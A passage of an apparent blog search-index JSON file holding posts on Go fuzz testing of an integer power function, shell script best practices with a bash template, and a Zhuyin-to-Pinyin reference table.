style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eexponent\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMaxUint\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebase\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprevResult\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFuzzPow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eF\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFuzz\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003euint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eresultDivX\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresultDivX\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","Testing"],"title":"善用 Go Fuzzing，幫助你寫出更完整的單元測試"},{"categories":["URL","SHELL","Linux"],"contents":" Shell Script Best Practices Things Just make the first line be #!/usr/bin/env bash. Use the .sh (or .bash) extension for your file. Use set -o errexit at the start of your script. Prefer to use set -o nounset. use \u0026quot;${VARNAME-}\u0026quot; instead of \u0026quot;$VARNAME\u0026quot; Use set -o pipefail. Use set -o xtrace, with a check on $TRACE env variable. if [[ \u0026quot;${TRACE-0}\u0026quot; == \u0026quot;1\u0026quot; ]]; then set -o xtrace; fi People can now enable debug mode, by running your script as TRACE=1 ./script.sh instead of ./script.sh. Use [[ ]] for conditions in if / while statements, instead of [ ] or test. Always quote variable accesses with double-quotes. Use local variables in functions. When printing error messages, please redirect to stderr. Use echo 'Something unexpected happened' \u0026gt;\u0026amp;2 for this. Use long options, where possible (like --silent instead of -s). If appropriate, change to the script\u0026rsquo;s directory close to the start of the script. Use cd \u0026ldquo;$(dirname \u0026ldquo;$0\u0026rdquo;)\u0026rdquo;, which works in most cases. Use shellcheck. Heed its warnings. Template #!/usr/bin/env bash set -o errexit set -o nounset set -o pipefail if [[ \u0026#34;${TRACE-0}\u0026#34; == \u0026#34;1\u0026#34; ]]; then set -o xtrace fi if [[ \u0026#34;${1-}\u0026#34; =~ ^-*h(elp)?$ ]]; then echo \u0026#39;Usage: ./script.sh arg-one arg-two This is an awesome bash script to make your life better. \u0026#39; exit fi cd \u0026#34;$(dirname \u0026#34;$0\u0026#34;)\u0026#34; main() { echo do awesome stuff } main \u0026#34;$@\u0026#34; ","date":"November 3, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221103-shell-script-best-practices/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sharats.me/posts/shell-script-best-practices/\" target=\"_blank\" rel=\"noopener\"\u003eShell Script Best Practices\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"things\"\u003eThings\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eJust make the first line be \u003ccode\u003e#!/usr/bin/env bash\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUse the \u003ccode\u003e.sh\u003c/code\u003e (or \u003ccode\u003e.bash\u003c/code\u003e) extension for your file.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o errexit\u003c/code\u003e at the start of your script.\u003c/li\u003e\n\u003cli\u003ePrefer to use \u003ccode\u003eset -o nounset\u003c/code\u003e.\n\u003col\u003e\n\u003cli\u003euse \u003ccode\u003e\u0026quot;${VARNAME-}\u0026quot;\u003c/code\u003e instead of \u003ccode\u003e\u0026quot;$VARNAME\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o pipefail\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o xtrace\u003c/code\u003e, with a check on \u003ccode\u003e$TRACE\u003c/code\u003e env variable.\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eif [[ \u0026quot;${TRACE-0}\u0026quot; == \u0026quot;1\u0026quot; ]]; then set -o xtrace; fi\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ePeople can now enable debug mode, by running your script as \u003ccode\u003eTRACE=1 ./script.sh\u003c/code\u003e instead of \u003ccode\u003e./script.sh\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e[[ ]]\u003c/code\u003e for conditions in \u003ccode\u003eif\u003c/code\u003e / \u003ccode\u003ewhile\u003c/code\u003e statements, instead of \u003ccode\u003e[ ]\u003c/code\u003e or \u003ccode\u003etest\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAlways quote variable accesses with double-quotes.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003elocal\u003c/code\u003e variables in functions.\u003c/li\u003e\n\u003cli\u003eWhen printing error messages, please redirect to stderr.\n\u003col\u003e\n\u003cli\u003eUse \u003ccode\u003eecho 'Something unexpected happened' \u0026gt;\u0026amp;2\u003c/code\u003e for this.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse long options, where possible (like \u003ccode\u003e--silent\u003c/code\u003e instead of \u003ccode\u003e-s\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eIf appropriate, change to the script\u0026rsquo;s directory close to the start of the script.\n\u003col\u003e\n\u003cli\u003eUse cd \u0026ldquo;$(dirname \u0026ldquo;$0\u0026rdquo;)\u0026rdquo;, which works in most cases.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eshellcheck\u003c/code\u003e. Heed its warnings.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"template\"\u003eTemplate\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o errexit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o nounset\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o pipefail\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eTRACE-0\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    set -o xtrace\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1-\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e~ ^-*h\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eelp\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e?$ \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Usage: ./script.sh arg-one arg-two\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eThis is an awesome bash script to make your life better.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edirname \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$0\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emain\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e awesome stuff\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emain \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","SHELL","Linux"],"title":"Shell Script Best Practices"},{"categories":["URL","SHELL","Linux"],"contents":" The Art of Command Line ","date":"November 2, 2022","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221102-the-art-of-command-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh-Hant.md\" target=\"_blank\" rel=\"noopener\"\u003eThe Art of Command Line\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","SHELL","Linux"],"title":"The Art of Command Line"},{"categories":["URL","pinyin"],"contents":" 一張圖學會【拼音輸入法】 聲母（Initials） 聲母 拼音 例字 ㄅ b 爸 ba、別 bie、奔 ben ㄆ p 撇 pie、平 ping、鵬 peng ㄇ m 媽 ma、莫 mo、某 mou ㄈ f 發 fa、飯 fan、風 feng ㄉ d 的 d、但 dan、段 duan ㄊ t 他 ta、貼 tie、團 tuan ㄋ n 你 ni、農 nong、暖 nuan ㄌ l 李 li、亂 luan、亮 liang ㄍ g 跟 gen、怪 guai、灌 guan ㄎ k 快 kuai、考 kao、狂 kuang ㄏ h 哈 ha、漢 han、橫 heng ㄐ j 叫 jiao、雞 ji、京 jing ㄑ q 七 qi、琴 qin、巧 qiao ㄒ x 西 xi、寫 xie、小 xiao ㄓ zh 知 zhi、戰 zhan、正 zheng ㄔ ch 吃 chi、船 chuan、重 chong ㄕ sh 是 shi、山 shan、刷 shuan ㄖ r 日 ri、讓 rang、人 ren ㄗ z 字 zi、讚 zan、昨 zuo ㄘ c 次 ci、菜 cai、餐 can ㄙ s 三 san、四 si、算 suan 介音 / 特殊聲母 類型 拼音 例字 y yi / i 以 yi、依 yi、修 xiu w wu / u 無 wu、溫 wen、船 chuan v yu / ü 律 lü、雨 yu、院 yuan 單韻母（Finals） 韻母 拼音 例字 ㄚ a 沙 sha、撒 sa、奧 ao ㄛ o 哦 o、偶 ou、歐 ou ㄜ e 餓 e、樂 le、設 she ㄝ ê / ye 也 ye、學 xue、切 qie ㄞ ai 愛 ai、篩 shai、崖 yai ㄟ ei 雷 lei、最 zui、脆 cui ㄠ ao 凹 ao、老 lao、笑 xiao ㄡ ou 歐 ou、樓 lou、手 shou ㄢ an 安 an、蘭 lan、算 suan ㄣ en 恩 en、林 lin、冷 leng ㄤ ang 昂 ang、浪 lang、讓 rang ㄥ eng 成 cheng、冷 leng、令 ling ㄦ er 二 er、兒 er、而 er 複韻母 / 組合韻 拼音 例字 ye 也 ye、結 jie、血 xie iu 六 liu、有 you、謬 miu in 音 yin、新 xin、林 lin ing 英 ying、靈 ling、醒 xing uan 元 yuan、卷 juan、團 tuan ue 略 lue、學 xue yun 雲 yun、巡 xun、群 qun ong 用 yong、兇 xiong、同 tong ui 鬼 gui、為 wei、虧 kui un 文 wen、混 hun、準 zhun ua 華 hua、抓 zhua、蛙 wa uai 壞 huai、快 kuai、踹 chuai ","date":"October 25, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20221025-zhuyin-pinyin/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://briian.com/zhuyin-pinyin\" target=\"_blank\" rel=\"noopener\"\u003e一張圖學會【拼音輸入法】\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"聲母initials\"\u003e聲母（Initials）\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e聲母\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄅ\u003c/td\u003e\n          \u003ctd\u003eb\u003c/td\u003e\n          \u003ctd\u003e爸 ba、別 bie、奔 ben\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄆ\u003c/td\u003e\n          \u003ctd\u003ep\u003c/td\u003e\n          \u003ctd\u003e撇 pie、平 ping、鵬 peng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄇ\u003c/td\u003e\n          \u003ctd\u003em\u003c/td\u003e\n          \u003ctd\u003e媽 ma、莫 mo、某 mou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄈ\u003c/td\u003e\n          \u003ctd\u003ef\u003c/td\u003e\n          \u003ctd\u003e發 fa、飯 fan、風 feng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄉ\u003c/td\u003e\n          \u003ctd\u003ed\u003c/td\u003e\n          \u003ctd\u003e的 d、但 dan、段 duan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄊ\u003c/td\u003e\n          \u003ctd\u003et\u003c/td\u003e\n          \u003ctd\u003e他 ta、貼 tie、團 tuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄋ\u003c/td\u003e\n          \u003ctd\u003en\u003c/td\u003e\n          \u003ctd\u003e你 ni、農 nong、暖 nuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄌ\u003c/td\u003e\n          \u003ctd\u003el\u003c/td\u003e\n          \u003ctd\u003e李 li、亂 luan、亮 liang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄍ\u003c/td\u003e\n          \u003ctd\u003eg\u003c/td\u003e\n          \u003ctd\u003e跟 gen、怪 guai、灌 guan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄎ\u003c/td\u003e\n          \u003ctd\u003ek\u003c/td\u003e\n          \u003ctd\u003e快 kuai、考 kao、狂 kuang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄏ\u003c/td\u003e\n          \u003ctd\u003eh\u003c/td\u003e\n          \u003ctd\u003e哈 ha、漢 han、橫 heng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄐ\u003c/td\u003e\n          \u003ctd\u003ej\u003c/td\u003e\n          \u003ctd\u003e叫 jiao、雞 ji、京 jing\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄑ\u003c/td\u003e\n          \u003ctd\u003eq\u003c/td\u003e\n          \u003ctd\u003e七 qi、琴 qin、巧 qiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄒ\u003c/td\u003e\n          \u003ctd\u003ex\u003c/td\u003e\n          \u003ctd\u003e西 xi、寫 xie、小 xiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄓ\u003c/td\u003e\n          \u003ctd\u003ezh\u003c/td\u003e\n          \u003ctd\u003e知 zhi、戰 zhan、正 zheng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄔ\u003c/td\u003e\n          \u003ctd\u003ech\u003c/td\u003e\n          \u003ctd\u003e吃 chi、船 chuan、重 chong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄕ\u003c/td\u003e\n          \u003ctd\u003esh\u003c/td\u003e\n          \u003ctd\u003e是 shi、山 shan、刷 shuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄖ\u003c/td\u003e\n          \u003ctd\u003er\u003c/td\u003e\n          \u003ctd\u003e日 ri、讓 rang、人 ren\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄗ\u003c/td\u003e\n          \u003ctd\u003ez\u003c/td\u003e\n          \u003ctd\u003e字 zi、讚 zan、昨 zuo\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄘ\u003c/td\u003e\n          \u003ctd\u003ec\u003c/td\u003e\n          \u003ctd\u003e次 ci、菜 cai、餐 can\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄙ\u003c/td\u003e\n          \u003ctd\u003es\u003c/td\u003e\n          \u003ctd\u003e三 san、四 si、算 suan\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"介音--特殊聲母\"\u003e介音 / 特殊聲母\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e類型\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ey\u003c/td\u003e\n          \u003ctd\u003eyi / i\u003c/td\u003e\n          \u003ctd\u003e以 yi、依 yi、修 xiu\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ew\u003c/td\u003e\n          \u003ctd\u003ewu / 